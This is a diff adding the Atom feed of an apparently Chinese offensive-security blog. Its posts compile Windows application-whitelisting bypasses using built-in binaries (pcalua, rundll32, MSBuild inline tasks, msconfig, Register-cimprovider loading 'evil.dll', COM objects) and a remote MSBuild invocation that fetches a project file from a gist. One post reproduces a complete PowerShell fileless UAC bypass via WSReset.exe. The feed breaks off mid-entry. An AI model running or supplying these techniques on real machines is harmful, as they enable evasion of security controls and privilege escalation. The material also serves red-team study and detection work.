@@ -1,0 +1,445 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Demonsec</title>
+  
+  <subtitle>Demonsec’S blog</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="www.ggsec.cn/"/>
+  <updated>2018-12-21T06:56:13.000Z</updated>
+  <id>www.ggsec.cn/</id>
+  
+  <author>
+    <name>Demon‘blog | 没有绝对安全的系统</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>即刻安全纯技术交流群</title>
+    <link href="www.ggsec.cn/jishu.html"/>
+    <id>www.ggsec.cn/jishu.html</id>
+    <published>2020-08-27T12:39:19.000Z</published>
+    <updated>2018-12-21T06:56:13.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E5%8D%B3%E5%88%BB%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E7%89%87mp4.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script><a id="more"></a><p> &nbsp; 其实我自己也想了很多很多，其实有一段时间比较低迷，有想过退出这个圈子，但是最后还是很多位朋友鼓励我，不要放弃，话实话进入这个圈子，也算是刚刚好一年了，个人也是一位业余爱好者的身份，来进行和你们交流和探讨，自己也是忧郁了很久很久，最终 看到咱们即刻群，基本都是整天水群，斗图，我看着实在是不忍心，即刻安全也是我的一部分，我也是其中的一份子，我的开始就是即刻安全！！即刻安全花费了我的很多心血，所以我重新开始整顿群，创建此群的初衷就是，无斗图、无广告、无水群的纯技术交流群。<br> &nbsp;<br> 感谢各位朋友粉丝的大力支持，也是才有我们即刻安全的今天。<br> 如有志同道合的朋友，欢迎加入我们即刻安全纯技术交流群：307283889<br> 希望进群的朋友能遵守规则：莫斗图、莫水群，希望能打造更好的技术交流氛围</p><pre><code>特此：即刻安全团体敬上                Demon  2017.8.27</code></pre><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E5%A3%81%E7%BA%B8.jpg" alt="enter description here"><br>&nbsp;</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BA873B7BBDED07564E11CA6736849726.png" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;div style=&quot;width:640px;height:480px;margin:0 auto;&quot; id=&quot;ivaLive&quot;&gt;&lt;/div&gt;&lt;/p&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+    var ivaInstance = new Iva(&#39;ivaLive&#39;, {
+        appkey: &#39;By9WGzBIx&#39;, //应用标示
+        video: &#39;https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E5%8D%B3%E5%88%BB%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E7%89%87mp4.mp4&#39;, //视频
+        title: &#39;test&#39;, //视频标题，后台视频管理中的标题
+        cover: &#39;&#39; //视频封面，只有在autoplay:false才可生效
+    });
+&lt;/script&gt;
+&lt;script src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js&quot;&gt;&lt;/script&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>AppLockerList</title>
+    <link href="www.ggsec.cn/appLockerList1.html"/>
+    <id>www.ggsec.cn/appLockerList1.html</id>
+    <published>2020-03-10T11:39:36.000Z</published>
+    <updated>2018-12-21T06:55:58.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/796F464239A249C20031545D2E441C5E.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="1-pcalua-exe-gt"><a href="#1-pcalua-exe-gt" class="headerlink" title="1.pcalua.exe:&gt;"></a>1.pcalua.exe:&gt;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p^c^a^l^u^a^ ^-^n^ ^-^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a</span><br><span class="line">^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a</span><br><span class="line">^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a</span><br><span class="line">^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a</span><br><span class="line">^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a</span><br><span class="line">^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a</span><br><span class="line">^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^a^a^^a^a</span><br><span class="line">^a^a^a^a^a^a^a^a^^a^a^a^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^</span><br><span class="line">n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^a^a^a^a^a^a^a^a^a^^a^a^a^a^a^a^a^a^n^a^n^a</span><br><span class="line">^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n</span><br><span class="line">^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a</span><br><span class="line">^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n</span><br><span class="line">^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n^a^n notepad.exe</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1520684757640.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Cache_1b2d7021fd334132..jpg" alt="enter description here"><br>&nbsp;</p><h2 id="2-Language-LUA-in-Files-wlua-gt"><a href="#2-Language-LUA-in-Files-wlua-gt" class="headerlink" title="2.Language LUA in Files .wlua:&gt;"></a>2.Language LUA in Files .wlua:&gt;</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/Cache_-142521484f69bba1..jpg" alt="enter description here"><br>&nbsp;</p><h2 id="3-INF-SCT"><a href="#3-INF-SCT" class="headerlink" title="3.INF-SCT"></a>3.INF-SCT</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> advpack<span class="selector-class">.dll</span>,LaunchINFSection  c:\test<span class="selector-class">.inf</span>,DefaultInstall_SingleUser,<span class="number">1</span>,</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1520695246464.jpg" alt="enter description here"></p><p><a href="https://twitter.com/bohops/status/967486047839014913" target="_blank" rel="noopener">https://twitter.com/bohops/status/967486047839014913</a></p><p><a href="https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf" target="_blank" rel="noopener">https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf</a></p><p><a href="https://github.com/homjxi0e/AppLockerBPG" target="_blank" rel="noopener">https://github.com/homjxi0e/AppLockerBPG</a><br>&nbsp;</p><h2 id="4-MSBuild-exe"><a href="#4-MSBuild-exe" class="headerlink" title="4.MSBuild.exe"></a>4.MSBuild.exe</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B18E7C8A823838321225F2D38477D618.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1DAE31B177A02BDC202AD0FE2C5D9298.jpg" alt="enter description here"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Local Invocation</span><br><span class="line">================</span><br><span class="line">[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');</span><br><span class="line">$proj = "c:\test\test.csproj";</span><br><span class="line">$e=new-object Microsoft.Build.Evaluation.Project($proj);</span><br><span class="line">$e.Build();</span><br><span class="line">or</span><br><span class="line">Add-Type -Path <span class="string">"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.dll"</span></span><br><span class="line">$proj = "c:\test\test.csproj";</span><br><span class="line">$e=new-object Microsoft.Build.Evaluation.Project($proj);</span><br><span class="line">$e.Build();</span><br><span class="line">Remote Invocation</span><br><span class="line">=================</span><br><span class="line">[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');</span><br><span class="line">$proj = [System.Xml.XmlReader]::create("https://gist.githubusercontent.com/bohops/a29a69cf127ffb0e37622d25b9f79157/raw/35fa4c5a0d2db037220f224b5c4c269ea243b3bd/test.csproj");</span><br><span class="line">$e=new-object Microsoft.Build.Evaluation.Project($proj);</span><br><span class="line">$e.Build();</span><br><span class="line">or</span><br><span class="line">Add-Type -Path <span class="string">"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.dll"</span></span><br><span class="line">$proj = [System.Xml.XmlReader]::create("https://gist.githubusercontent.com/bohops/a29a69cf127ffb0e37622d25b9f79157/raw/35fa4c5a0d2db037220f224b5c4c269ea243b3bd/test.csproj");</span><br><span class="line">$e=new-object Microsoft.Build.Evaluation.Project($proj);</span><br><span class="line">$e.Build();</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion=<span class="string">"4.0"</span> xmlns=<span class="string">"http://schemas.microsoft.com/developer/msbuild/2003"</span>&gt;</span><br><span class="line">  &lt;Target Name=<span class="string">"Hello"</span>&gt;</span><br><span class="line">   &lt;FragmentExample /&gt;</span><br><span class="line">   &lt;ClassExample /&gt;</span><br><span class="line">  &lt;/Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName=<span class="string">"FragmentExample"</span></span><br><span class="line">    TaskFactory=<span class="string">"CodeTaskFactory"</span></span><br><span class="line"> AssemblyFile=<span class="string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"</span> &gt;</span><br><span class="line">    &lt;ParameterGroup/&gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">      &lt;Using Namespace=<span class="string">"System"</span> /&gt;  </span><br><span class="line">      &lt;Code Type=<span class="string">"Fragment"</span> Language=<span class="string">"cs"</span>&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">&lt;/UsingTask&gt;</span><br><span class="line">&lt;UsingTask</span><br><span class="line">    TaskName=<span class="string">"ClassExample"</span></span><br><span class="line">    TaskFactory=<span class="string">"CodeTaskFactory"</span></span><br><span class="line">    AssemblyFile=<span class="string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"</span> &gt;</span><br><span class="line">&lt;Task&gt;</span><br><span class="line">&lt;!-- &lt;Reference Include=<span class="string">"System.IO"</span> /&gt; Example Include --&gt;</span><br><span class="line">      &lt;Code Type=<span class="string">"Class"</span> Language=<span class="string">"cs"</span>&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using Microsoft.Build.Framework;</span><br><span class="line">using Microsoft.Build.Utilities;</span><br><span class="line"></span><br><span class="line">public class ClassExample :  Task, ITask</span><br><span class="line">&#123;</span><br><span class="line">public override bool Execute()</span><br><span class="line">&#123;</span><br><span class="line">                    System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><br><span class="line">                    proc.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";</span><br><span class="line">                    proc.Start();</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">  &lt;/UsingTask&gt;</span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure><p><a href="https://twitter.com/bohops/status/971026915736899585" target="_blank" rel="noopener">https://twitter.com/bohops/status/971026915736899585</a><br><a href="https://gist.github.com/bohops/a29a69cf127ffb0e37622d25b9f79157" target="_blank" rel="noopener">https://gist.github.com/bohops/a29a69cf127ffb0e37622d25b9f79157</a></p><h2 id="5-bypassUAC-inf"><a href="#5-bypassUAC-inf" class="headerlink" title="5.bypassUAC- inf"></a>5.bypassUAC- inf</h2><p><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec" target="_blank" rel="noopener">https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/73C5C696FC0B1C87E9B1DF9924048DFF.jpg" alt="enter description here"></p><h2 id="6-rundll32-exe"><a href="#6-rundll32-exe" class="headerlink" title="6.rundll32.exe"></a>6.rundll32.exe</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/83309E1B1069CA79F74AABCCD5AEAA3D.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6C99AF94C094ECF589F84CBE22769C61.jpg" alt="enter description here"></p><h2 id="7-ATPSJScript"><a href="#7-ATPSJScript" class="headerlink" title="7.ATPSJScript"></a>7.ATPSJScript</h2><p><a href="https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec" target="_blank" rel="noopener">https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1521117181892.jpg" alt="enter description here"></p><h2 id="8-Reflection-Assembly"><a href="#8-Reflection-Assembly" class="headerlink" title="8.Reflection.Assembly"></a>8.Reflection.Assembly</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\demon&gt;    <span class="variable">$RAS</span> = Join-Path -Path c:\windows\system32\ -ChildPath </span><br><span class="line">calc.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\demon&gt;   [Reflection.Assembly]::LoadWithPartialName</span><br><span class="line">('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::Shell("$RAS","0");</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6400B060F225D9AEAFBB66F93CCEA2FF.jpg" alt="enter description here"></p><h2 id="9-rundll32"><a href="#9-rundll32" class="headerlink" title="9.rundll32"></a>9.rundll32</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> C:\Windows\System32\pcwutl<span class="selector-class">.dll</span>,LaunchApplication calc.exe</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> shell32<span class="selector-class">.dll</span>,ShellExec_RunDLL  C:\Windows\System32\cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/30BD1EBA-BB5C-4FDE-AEFB-7F6629A7A70E.png" alt="enter description here"></p><h2 id="10-sigverif-exe"><a href="#10-sigverif-exe" class="headerlink" title="10.sigverif.exe"></a>10.sigverif.exe</h2><p><a href="http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/</a></p><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/sigverif.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="11-msconfig"><a href="#11-msconfig" class="headerlink" title="11.msconfig"></a>11.msconfig</h2><figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version="1.0" ?&gt;</span><br><span class="line">&lt;MSCONFIGTOOLS&gt;</span><br><span class="line">&lt;a NAME="LOLBin" PATH="%windir%\system32\WindowsPowerShell\v1.0\powershell.exe"</span><br><span class="line">DEFAULT_OPT="-command calc.exe " </span><br><span class="line">HELP="LOLBin MSCONFIGTOOLS"/&gt;</span><br><span class="line">&lt;/MSCONFIGTOOLS&gt;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4EF4BB29-4BDF-4265-A9A5-FF62C278A234.png" alt="enter description here"></p><ol><li>讲上述代码 写为mscfgtlc.xml  放置路径为C:\Windows\System32</li></ol><p>2.启动CMD ：msconfig -5</p><ol start="3"><li>找到LOLBin一栏 点击启动 触发条件<br><a href="https://twitter.com/pabraeken/status/991314564896690177" target="_blank" rel="noopener">https://twitter.com/pabraeken/status/991314564896690177</a></li></ol><h2 id="12-DXCap-exe"><a href="#12-DXCap-exe" class="headerlink" title="12.DXCap.exe"></a>12.DXCap.exe</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DXCap<span class="selector-class">.exe</span> -c C:\Windows\System32\notepad.exe</span><br></pre></td></tr></table></figure><p><a href="https://twitter.com/harr0ey/status/992008180904419328" target="_blank" rel="noopener">https://twitter.com/harr0ey/status/992008180904419328</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/493ABA67CD0EE259E6ACE72AF3F18BB0.png" alt="enter description here"></p><h2 id="13-Register-cimprovider-exe"><a href="#13-Register-cimprovider-exe" class="headerlink" title="13.Register-cimprovider.exe"></a>13.Register-cimprovider.exe</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Register-cimprovider -path "C:<span class="tag">\<span class="name">folder</span></span><span class="tag">\<span class="name">evil</span></span>.dll"</span><br></pre></td></tr></table></figure><p><a href="https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md" target="_blank" rel="noopener">https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/A68A0BB2F11D180A4A7D2361BB1BD4CF.jpg" alt="enter description here"></p><h2 id="14-COMHijacking18-reg"><a href="#14-COMHijacking18-reg" class="headerlink" title="14.COMHijacking18.reg"></a>14.COMHijacking18.reg</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$COMobj = [activator]::CreateInstance([type]::GetTypeFromCLSID("&#123;00020000-0000-0000-C000-000000000046&#125;"));$COMobj.Exec();</span><br></pre></td></tr></table></figure><p><a href="https://gist.github.com/homjxi0e/40f30c3be62c6ef152d6f6fffa9dba3c" target="_blank" rel="noopener">https://gist.github.com/homjxi0e/40f30c3be62c6ef152d6f6fffa9dba3c</a><br><a href="https://twitter.com/harr0ey/status/993778424853549056" target="_blank" rel="noopener">https://twitter.com/harr0ey/status/993778424853549056</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8B3C3B183E825865750E06B5F4A83BD9.png" alt="enter description here"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/796F464239A249C20031545D2E441C5E.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WSReset-uac</title>
+    <link href="www.ggsec.cn/WSReset-uac.html"/>
+    <id>www.ggsec.cn/WSReset-uac.html</id>
+    <published>2019-08-08T11:22:15.000Z</published>
+    <updated>2019-08-08T11:28:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/FFEF1A23D4A154FCC01D95FF1206E9FE.jpg" alt="enter description here"><br><a id="more"></a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1565263549978.jpg" alt="enter description here"></p><p><a href="https://www.activecyber.us/activelabs/windows-uac-bypass" target="_blank" rel="noopener">https://www.activecyber.us/activelabs/windows-uac-bypass</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">Fileless UAC Bypass by Abusing Shell API</span><br><span class="line"></span><br><span class="line">Author: Hashim Jawad of ACTIVELabs</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.PARAMETER</span> Command</span><br><span class="line">Specifies the command you would like to run <span class="keyword">in</span> high integrity context.</span><br><span class="line"> </span><br><span class="line">.EXAMPLE</span><br><span class="line">Invoke-WSResetBypass -Command <span class="string">"C:\Windows\System32\cmd.exe /c start cmd.exe"</span></span><br><span class="line"></span><br><span class="line">This will effectivly start cmd<span class="selector-class">.exe</span> <span class="keyword">in</span> high integrity context.</span><br><span class="line"></span><br><span class="line">.NOTES</span><br><span class="line">This UAC bypass has been tested on the following:</span><br><span class="line"> - Windows <span class="number">10</span> Version <span class="number">1803</span> OS Build <span class="number">17134.590</span></span><br><span class="line"> - Windows <span class="number">10</span> Version <span class="number">1809</span> OS Build <span class="number">17763.316</span></span><br><span class="line">#&gt;</span><br><span class="line"></span><br><span class="line">function Invoke-WSResetBypass &#123;</span><br><span class="line">      Param (</span><br><span class="line">      [String]<span class="variable">$Command</span> = <span class="string">"C:\Windows\System32\cmd.exe /c start cmd.exe"</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="variable">$CommandPath</span> = <span class="string">"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"</span></span><br><span class="line">      <span class="variable">$filePath</span> = <span class="string">"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"</span></span><br><span class="line">      New-Item $CommandPath -Force | Out-Null</span><br><span class="line">      New-ItemProperty -Path $CommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null</span><br><span class="line">      Set-ItemProperty -Path $CommandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null</span><br><span class="line">      Write-Host <span class="string">"[+] Registry entry has been created successfully!"</span></span><br><span class="line"></span><br><span class="line">      <span class="variable">$Process</span> = Start-Process -FilePath <span class="string">"C:\Windows\System32\WSReset.exe"</span> -WindowStyle Hidden</span><br><span class="line">      Write-Host <span class="string">"[+] Starting WSReset.exe"</span></span><br><span class="line"></span><br><span class="line">      Write-Host <span class="string">"[+] Triggering payload.."</span></span><br><span class="line">      Start-Sleep -Seconds <span class="number">5</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (Test-Path <span class="variable">$filePath</span>) &#123;</span><br><span class="line">      Remove-Item <span class="variable">$filePath</span> -Recurse -Force</span><br><span class="line">      Write-Host <span class="string">"[+] Cleaning up registry entry"</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/FFEF1A23D4A154FCC01D95FF1206E9FE.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
+    
+    
+      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sudo-ed-提权</title>
+    <link href="www.ggsec.cn/sudo-ed.html"/>
+    <id>www.ggsec.cn/sudo-ed.html</id>
+    <published>2019-08-07T10:52:13.000Z</published>
+    <updated>2019-08-07T10:55:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190807_184957.jpg" alt="enter description here"><br><a id="more"></a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1565175283273.jpg" alt="enter description here"></p><p><a href="https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/</a><br><a href="https://www.freebuf.com/sectool/209494.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/209494.html</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190807_184957.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Run-key-hexacorn持久性 2</title>
+    <link href="www.ggsec.cn/Run-key-hexacorn2.html"/>
+    <id>www.ggsec.cn/Run-key-hexacorn2.html</id>
